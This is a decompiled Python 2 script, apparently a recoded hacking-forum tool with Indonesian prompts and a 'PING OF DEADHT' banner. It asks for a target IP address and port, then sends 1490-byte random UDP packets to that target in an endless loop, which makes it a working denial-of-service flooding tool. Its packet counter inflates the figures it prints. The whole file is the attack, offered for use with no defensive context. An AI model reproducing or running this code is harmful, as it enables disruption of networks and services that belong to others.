# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <febry>
import sys, os, time, socket, random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
os.system('figlet POD')
print
print '\x1b[32;1m<=======================================>'
print '\x1b[34;1m||========>PING OF DEADHT<=========||'
print '\x1b[32;1m<=======================================>'
print 'RECODE=Mrlinkerrorsystem'
print
ip = raw_input('MASUKAN IP TAGET ===> ')
port = input('Port       ===> ')
os.system('clear')
os.system('figlet Loading..')
print 'membutuhkan waktu 5 detik'
time.sleep(5)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1000000000
    port = port + 0
    print '\x1b[31;1mMengirim %s packet ke %s throught port:%s' % (sent, ip, port)
    if port == 65534:
        port = 0